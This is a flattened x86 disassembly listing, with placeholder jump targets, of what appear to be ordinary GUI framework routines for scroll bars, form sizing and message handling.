mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_44eac0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43db40
push eax
call sub_4237d0
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43db40
push eax
call sub_4237d0
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43db40
push eax
call sub_4237d0
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41bd78
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43db40
push eax
call sub_4237d0
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43db40
push eax
call sub_4237d0
sub_44ebc8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44e4dc
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44e4dc
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_44eac0
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43db40
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_44e944
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_44e4dc
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_44ece0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43986c
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44e15c
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44e15c
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_44ed58
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403234
mov eax [ esi + 0x20c ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_439990
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_44eda4
push ebx
mov ebx eax
mov eax ebx
call sub_43aaf8
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_44efbc
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40bad0
test al al
jne r-xdata
mov eax ebx
call sub_43db40
push eax
call sub_423804
sub_44ede4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ef3c
mov ecx edi
mov edx esi
mov eax ebx
call sub_43a240
pop edi
pop esi
pop ebx
retn
sub_44ee24
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_436d5c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_44e3f4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_43a870
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_44e944
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43a834
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43a834
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_4136e4
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_436ac8
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ef33
mov eax [ ebp - 0x10 ]
call sub_403234
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44e23c
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_413840
xor ecx ecx
mov edx 0xb03e
call sub_43850c
inc ebx
dec esi
jne r-xdata
sub_44ef60
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_44ea94
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_44ea94
mov eax ebx
call sub_44ef3c
jmp r-xdata
sub_44efbc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43de44
test al al
je r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_44e55c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44e55c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_44ebc8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_44ebc8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_44ebc8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_44ebc8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_44ebc8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_44ebc8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_44f0cc
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_436e70
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_436e9c
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_436e70
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_436e9c
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_436d5c
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_44e944
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_436d5c
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_436da0
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_44e944
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_436d5c
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_44e944
mov eax ebx
call sub_436d5c
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_436da0
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_436da0
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_44e944
mov eax ebx
call sub_436da0
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_44f220
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_44e944
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_44e944
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_44ea94
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_44ea94
sub_44f2c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44f220
mov ecx edi
mov edx esi
mov eax ebx
call sub_43d64c
pop edi
pop esi
pop ebx
retn
sub_44f2ec
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43c12c
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f35d
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_44f35d
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44ef3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f39c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_44f39c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44efbc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_44f410
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_436da0
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_421bb0
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_436d5c
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_421bb0
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_412434
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_439bac
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44f480
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4033c0
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43cebc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f4e8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_44f510
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_40317c
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f65b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_413600
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403184
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
call sub_4039a8
sub_44f69c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403430
and [ ebx + 0x2f4 ] 0xdf
sub_44f6d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44ece0
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_436ac8
xor edx edx
mov eax ebx
call sub_436aec
mov edx 0x140
mov eax ebx
call sub_436b14
mov edx 0xf0
mov eax ebx
call sub_436b38
mov dl 0x1
mov eax [ r-xdata ]
call sub_421144
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_44fff0
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_435f34
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_40317c
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_450354
xor edx edx
mov eax ebx
call sub_43751c
xor edx edx
mov eax ebx
call sub_437484
mov dl 0x1
mov eax ebx
call sub_43dc80
mov edx ebx
mov eax [ rw-data ]
call sub_4549b8
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_44f84d
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_419480
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_413984
xor edx edx
mov eax ebx
call sub_416404
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_453860
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_44f8b8
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035a8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4521dc
mov eax [ ebp - 0x4 ]
call sub_43de44
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4549f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403234
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403234
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40cbf8
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44ed58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f989
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_44f99c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_44f9dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_450354
sub_44f9e2
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403430
test al al
jne r-xdata
call sub_403a24
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_4039d0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_450354
sub_44fa18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_44fa59
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_44fa78
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_439414
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403430
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_451d20
sub_44fab4
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_436828
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_4136e4
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_451118
mov edx esi
mov eax ebp
call sub_413984
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4510f0
mov edx esi
mov eax edi
call sub_451118
jmp r-xdata
xor edx edx
mov eax edi
call sub_4510cc
sub_44fbc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43a3d8
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_439b34
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_436d74
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_436db8
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_44ff48
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43850c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fe1d
mov eax [ ebp - 0x4 ]
call sub_43a3e0
retn
mov ecx 0x1
mov edx 0x1
